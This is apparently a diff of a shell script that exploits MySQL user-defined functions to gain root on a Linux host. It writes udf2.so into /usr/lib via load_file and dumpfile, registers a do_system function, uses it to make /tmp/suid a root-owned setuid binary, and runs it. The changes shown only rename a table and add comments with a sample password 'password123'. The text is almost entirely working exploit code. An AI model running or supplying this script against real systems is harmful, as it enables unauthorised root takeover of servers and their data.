@@ -53,18 +53,18 @@ EOF
 gcc suid.c -o /tmp/suid
 cat <<EOF > priv.sql
 use mysql;
-create table aoo(line blob);
-insert into aoo values(load_file('/home/j0hn/udf2.so'));
-select * from aoo into dumpfile '/usr/lib/udf2.so';
+create table sai(line blob);
+insert into sai values(load_file('/home/j0hn/udf2.so'));
+select * from sai into dumpfile '/usr/lib/udf2.so';
 create function do_system returns integer soname 'udf2.so';
 #select * from mysql.func;
 EOF
-mysql -u root < priv.sql >/dev/null 2>&1
+mysql -u root < priv.sql >/dev/null 2>&1 # mysql -u root -p password123 < priv.sql
 echo "[+] pwned !!!"
 cat <<EOF > suid.sql
 #select do_system('gcc /home/j0hn/suid.c -o /tmp/suid');
 select do_system('chown root:root /tmp/suid && chmod u+s /tmp/suid');
 EOF
-mysql -u root < suid.sql >/dev/null 2>&1
+mysql -u root < suid.sql >/dev/null 2>&1  #for pass : mysql -u root -p password123 < suid.sql
 echo "[+] uid(0) !!!"
 /tmp/suid
